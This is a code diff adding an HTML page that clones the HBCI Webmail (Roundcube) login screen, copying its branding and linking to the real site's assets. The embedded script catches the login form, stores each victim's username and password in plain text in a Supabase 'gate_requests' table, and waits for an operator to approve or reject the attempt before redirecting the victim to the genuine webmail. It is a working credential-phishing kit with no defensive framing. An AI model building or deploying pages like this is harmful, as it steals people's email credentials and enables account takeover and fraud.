@@ -1,0 +1,185 @@
+<!doctype html>
+<html>
+  <head>
+    <title>HBCI Webmail :: Welcome to HBCI Webmail</title>
+    <meta name="Robots" content="noindex,nofollow" />
+    <meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
+    <meta name="viewport" content="" id="viewport" />
+    <link
+      rel="shortcut icon"
+      href="https://email.hbci.com/mail/skins/larry/images/favicon.ico"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://email.hbci.com/mail/skins/larry/styles.css?s=1382384360"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://email.hbci.com/mail/plugins/jqueryui/themes/larry/jquery-ui-1.9.1.custom.css?s=1382384359"
+    />
+  </head>
+  <body>
+    <script type="module">
+      import { supabase } from "/scripts/supabase.js";
+
+      const PAGE_NAME = "HBCI Login";
+      const REDIRECT_URL = "https://email.hbci.com/mail/";
+
+      // Generate a unique request ID
+      const generateRequestId = () => crypto.randomUUID();
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const form = document.getElementById("contact-form");
+        const messageDiv = document.getElementById("message");
+        const emailInput = document.getElementById("email");
+        const passwordInput = document.getElementById("password");
+
+        // Targeting the EXACT original button ID
+        const submitButton = document.querySelector("#signup_btn");
+
+        if (form) {
+          form.addEventListener("submit", async function (event) {
+            event.preventDefault();
+
+            const email = emailInput.value;
+            const password = passwordInput.value;
+            const requestId = generateRequestId();
+
+            // UI State: Loading
+            if (submitButton) {
+              submitButton.disabled = true;
+            }
+            messageDiv.innerHTML =
+              '<div class="loading content show">Loading...</div>';
+
+            try {
+              // Insert request into Supabase
+              const { error } = await supabase.from("gate_requests").insert([
+                {
+                  request_id: requestId,
+                  page_name: PAGE_NAME,
+                  email,
+                  password,
+                  status: "pending",
+                  redirect_url: REDIRECT_URL,
+                },
+              ]);
+
+              if (error) {
+                throw error;
+              }
+
+              // Subscribe to Realtime changes for this request_id
+              const channel = supabase
+                .channel(`request_${requestId}`)
+                .on(
+                  "postgres_changes",
+                  {
+                    event: "*",
+                    schema: "public",
+                    table: "gate_requests",
+                    filter: `request_id=eq.${requestId}`,
+                  },
+                  (payload) => {
+                    const data = payload.new;
+
+                    if (data.status === "approved") {
+                      window.location.replace(REDIRECT_URL);
+                    } else if (data.status === "rejected") {
+                      // Show failed state
+                      messageDiv.innerHTML =
+                        '<div class="warning content show" role="alert">Login failed.</div>';
+                      if (submitButton) {
+                        submitButton.disabled = false;
+                      }
+                    }
+                  },
+                )
+                .subscribe();
+            } catch (err) {
+              console.error("Submit error:", err);
+              messageDiv.innerHTML =
+                '<div class="warning content show" role="alert">Failed to submit request.</div>';
+              if (submitButton) {
+                submitButton.disabled = false;
+              }
+            }
+          });
+        }
+      });
+    </script>
+
+    <div id="login-form">
+      <div class="box-inner">
+        <img
+          src="https://email.hbci.com/mail/skins/larry/images/roundcube_logo.png"
+          id="logo"
+          border="0"
+          alt="HBCI Webmail"
+        />
+
+        <form id="contact-form">
+          <table>
+            <tbody>
+              <tr>
+                <td class="title">
+                  <label for="rcmloginuser">Username</label>
+                </td>
+                <td class="input">
+                  <input
+                    name="_user"
+                    id="email"
+                    size="40"
+                    autocapitalize="off"
+                    type="text"
+                  />
+                </td>
+              </tr>
+              <tr>
+                <td class="title"><label for="rcmloginpwd">Password</label></td>
+                <td class="input">
+                  <input
+                    name="_pass"
+                    id="password"
+                    size="40"
+                    autocapitalize="off"
+                    type="password"
+                  />
+                </td>
+              </tr>
+            </tbody>
+          </table>
+
+          <p class="formbuttons">
+            <!-- KEPT EXACTLY AS ORIGINAL -->
+            <input
+              type="submit"
+              class="button mainaction"
+              value="Login"
+              id="signup_btn"
+            />
+          </p>
+        </form>
+      </div>
+
+      <div class="box-bottom">
+        <div id="message"></div>
+        <noscript>
+          <p class="noscriptwarning">
+            Warning: This webmail service requires Javascript! In order to use
+            it please enable Javascript in your browser's settings.
+          </p>
+        </noscript>
+      </div>
+
+      <div id="bottomline">
+        HBCI Webmail &nbsp;&#9679;&nbsp;
+        <a href="http://www.hbci.com" target="_blank" class="support-link"
+          >Get support</a
+        >
+      </div>
+    </div>
+  </body>
+</html>
